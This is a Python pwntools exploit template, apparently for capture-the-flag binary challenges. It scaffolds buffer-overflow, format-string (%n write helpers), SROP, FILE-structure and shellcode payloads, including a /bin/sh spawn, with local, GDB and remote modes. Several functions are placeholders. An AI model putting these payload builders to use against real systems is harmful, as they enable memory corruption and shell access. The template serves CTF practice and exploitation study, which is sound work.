#!/usr/bin/python3
from pwn import *
import warnings
from ctypes import *
import os


# libc = CDLL("libc.so.6")
# libc.srand(42)
# print(libc.rand() % 32768)
def is_tmux_running():
    return 'TMUX' in os.environ

# Specify GDB script here (breakpoints etc)
gdbscript = '''
#init-pwndbg #only if we need it
#breakrva 0x11f #Offset for pie exectuable (delete this command when using breakrva)
break _start
break *main
#ignore 23 1000000   # set ignore count very high.  set an 'ignore count' for that breakpoint number, ignore ID count  
continue
'''.format(**locals())

warnings.filterwarnings(action='ignore', category=BytesWarning)

EXE = './vuln'
if is_tmux_running():
    context.terminal = ['tmux', 'new-window']
# This will automatically get context arch, bits, os etc
# Need to add ELF() and ROP() for this list
ELF_FILE = context.binary = ELF(EXE, checksec=False)
context.cyclic_size = ELF_FILE.bytes
ELF_ROP = ROP(ELF_FILE)
LIBC_FILE = ELF_FILE.libc
LIBC_ROP = ''
LD_FILE = ''   
LD_ROP = ''   

def main():
    global ELF_FILE, ELF_ROP, LIBC_FILE, LIBC_ROP, LD_FILE, LD_ROP

    # Change logging level to help with debugging (warning/info/debug)
    #context.log_level = "INFO"
    if args.LOG_LEVEL:
        context.log_level = args.LOG_LEVEL

    # loop_progress = log.progress('Brute Force')
    # flag_progress = log.progress("Flag")
    # loop_progress.status(f'Trying Ascii {i} For letter number {len(flag) + 1}')       
    # flag_progress.status(flag)
    # flag_progress.success(flag)
    
    # Binary filename


    # Start program
    io = start()
    shortcut(io)

    # elf.get_section_by_name('.init_array').header.sh_addr     #Get the specific section address

    # ld_elf = ELF(LD_FILE, checksec=False)
    # ld_rop = ROP(ld)
    # p.libs() # retrun all the libs in the file
    # symbols = {'__GI__IO_puts':0xf7dd4c40, 'atol':0xf7d99770, 'setvbuf':0xf7dd5430, 'setresgid':0xf7e31470 , '__libc_start_main':0xf7d81de0}
    #  libcdb.search_by_symbol_offsets(symbols=symbols, return_as_list=True)[0]

    # ===========================================================
    #                    EXPLOIT GOES HERE
    # ===========================================================



    if args.FMT:
        FMT()


    # Pass in pattern_size, get back EIP/RIP offset
    #offset = find_ip(cyclic(100))
    offset = 0
    # Build the payload
    # pack(-1) or str(-1 or variable) # if you need to send numbers 
    # rop = ROP(ELF_FILE)
    # set the following registers
    # rop(rax=constants.SYS_read, rdi=constants.STDIN_FILENO, rsi=0x6b7000, rdx=0x9)
    # set raw or set to an address of (specific gadget) here is eax gadget 
    # rop.raw(rop.eax) 
    # rop.raw(0x12345678)
    # or you call directly the syscall
    # rop.call('execve',[0x6b7000, 0, 0])
    # print(rop.dump())

    payload = flat({
        offset: [
            # rop.build(),

        ]
    })
    shellcode = GENERATE_SHELLCODE()
    # libc_base = puts_leak - libc.symbols["puts"]

    if args.FMT_READ:
        payload = FMT_READ(9)

    if args.FMT_PAYLOAD:
        payload = FMT_PAYLOAD()

    if args.FILEIO:
        payload = FILEIO()

    if args.SROP:
        payload = SROP()

    if args.CSU:
        payload = CSU()

    if args.DLRESOLVE:
        payload = DLRESOLVE()

    # Save the payload to file
    write('payload', payload)

    add_waits_test(io)

    # Get our flag!
    if args.FLAG:
        flag = io.recvall()
        success(flag)
    else: # Got Shell? no need to waint in GDB
        io.interactive()
    return 0

   
# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([context.binary.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
#         libc_elf = io.libc
#         if libc_elf:
#             libc_rop = ROP(libc_elf)
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        io = process([EXE] + argv, *a, **kw)
#        libc_elf = io.libc
#        if libc_elf:
#            libc_rop = ROP(libc_elf)
        return io

sa = lambda *args, **kwargs: None
sla = lambda *args, **kwargs: None
ru = lambda *args, **kwargs: None
def shortcut(io):
    global sa
    sa = lambda x,y : io.sendafter(x,y)
    global sla
    sla = lambda x,y : io.sendlineafter(x,y)
    global ru
    ru = lambda x : io.readuntil(x)

def GENERATE_SHELLCODE():
    # Example for shellcode in pwntools
    # int.from_bytes(asm('call $-0xCD'), byteorder='little') #for indirect jumps or calls
    # When we want to asm jmp 0xdeadbeaf, we can use jmp [rip+offset].
    # When we want to asm jne 0xdeadbeaf, we can use position: mov eax; jne position.
    return asm(shellcraft.sh())    
    


    
def FILEIO():
    ### See in GDB `p *(FILE *) $rax` Or `p *(struct _IO_FILE_plus *) $rax`   
    fileStr = FileStructure()
    # size must be greater the the size of the fwrite/freed etc
    payload = fileStr.write(addr=0xcafebabe, size=100) #Writing data out from arbitrary memory address.
    payload = fileStr.read(addr=0xcafebabe, size=100) #Reading data into arbitrary memory location.
    fileno: constants.STDIN_FILENO
    print (fileStr)
    payload = bytes(payload) # + b'0x00' sometimes it happen that fileno is not the correct one
    return payload
    
    
def CSU():
    payload = ''
    print ('work in progress')
    return payload
    

def DLRESOLVE():
    payload = ''
    print ('work in progress')
    return payload


def SROP():
    payload = SigreturnFrame()
    payload.rip = ELF_FILE.sym.syscall
    payload.rax = constants.SYS_write
    payload.rdi = constants.STDOUT_FILENO
    payload.rsi = ELF_FILE.sym.flag
    payload.rdx = 0x80
    return bytes(payload)  


def slog(name, addr):
    return success(": ".join([name, hex(addr)]))


def get_offset_as_int(s):
    if "0x" in s[0:2]:
        return int(s, 16)
    else:
        return int(s)


def FMT_READ(offset):
    return f'%{offset}$0{ELF_FILE.bytes * 2}lx'


def FMT_PAYLOAD():
    #fmtstr_payload(offset, {addr: value, addr2: value2}, numbwritten=0, write_size='int|short|byte|')
    #   offset (int) – the first formatter’s offset you control (You can check that manuall or auto with args.FMT)
    #   writes (dict) – dict with addr, value {addr: value, addr2: value2} (addr where to write, value to write)
    #   numbwritten (int) – number of byte already written by the printf function (best to test with 0 and then you can find that by yourself in gdb)
    #   write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
    #   (int will be diffcult in remote server because a lot of write is needed)
    payload = fmtstr_payload(1, {0x0: 0x1337babe}, numbwritten=0, write_size='byte')
    print ('#########################')
    print ('Generating FMT_PAYLOAD: {}'.format(payload))
    hexdump(payload)
    return payload

        
def fmtstr(payload, prints, index, data, byte=1):
    """
    data: data that want to be written into the address
    index: stack position (ex. %7$n --> index = 7)
    prints: total charaters that have been print out
    payload: whole payload string, initial value are addresses (and if we need to adjust the stack for a 4 alignment byte [see in next exmaple])
    
    ex.  payload = p32(addr) + p32(addr2) + p32(addr3)
         prints = 12
         payload, prints = fmtstr(payload, prints, 7, 0xa0a0, 2)
         payload, prints = fmtstr(payload, prints, 8, 0xc0, 1)
         payload, prints = fmtstr(payload, prints, 9, 0x08047654, 4)

    ex.  payload = b"XX"+ p32(elf.get_section_by_name('.fini_array').header.sh_addr) + p32(elf.got['strlen']) + p32(elf.got['strlen']+2)
         prints = len(payload) + 0x12 # good to see that the actual write is 0x14 but this is 0x12 becasue the "XX" in the begining in the payload
         payload, prints = fmtstr(payload, prints, 12, 0x85ed, 2)
         payload, prints = fmtstr(payload, prints, 13, 0x8490, 2)
         payload, prints = fmtstr(payload, prints, 14, 0x0804, 2)
    """

    if data - prints > 0:
        num = data - prints
    else:
        num = data + 256**byte - prints
        while(num <= 0):
            num += 256**byte

    payload += ("%" + str(num) + "c").encode()
    prints = data

    if byte == 1:
        payload += ("%" + str(index) + "$hhn").encode()
    elif byte == 2:
        payload += ("%" + str(index) + "$hn").encode()
    elif byte == 4:
        payload += ("%" + str(index) + "$n").encode()
    elif byte == 8:
        payload += ("%" + str(index) + "$lln").encode()

    return payload, prints


#TODO doesn't work need to refactor
# Find offset to EIP/RIP for buffer overflows 
def find_ip(payload):
    # Launch process and send payload
    if args.OFFSET:
        return get_offset(args["OFFSET"])
    p = process(EXE)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    core = p.corefile
    offset = cyclic_find(core.read(core.rsp, 8), n=8)
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# In case that there is some printf & puts we need to recv multipletimes
def add_waits_test(io):
    if args.PUTSNUM:
        numebr_of_prints = int(args.PUTSNUM)
        for i in range(numebr_of_prints):
            io.recv()
           

def FMT():
    autofmt = FmtStr(exec_fmt)
    success("[Guessed] Offset in stack is: {0} numbwitten is {1} and padlen is {2}".format(autofmt.offset, autofmt.numbwritten, autofmt.padlen))
    quit()
    
    
# Reslove the offset used for format string
def exec_fmt(payload):
    p = process(EXE)
    p.sendline(payload)
    return p.recvall()


if __name__ == "__main__":
    main()    
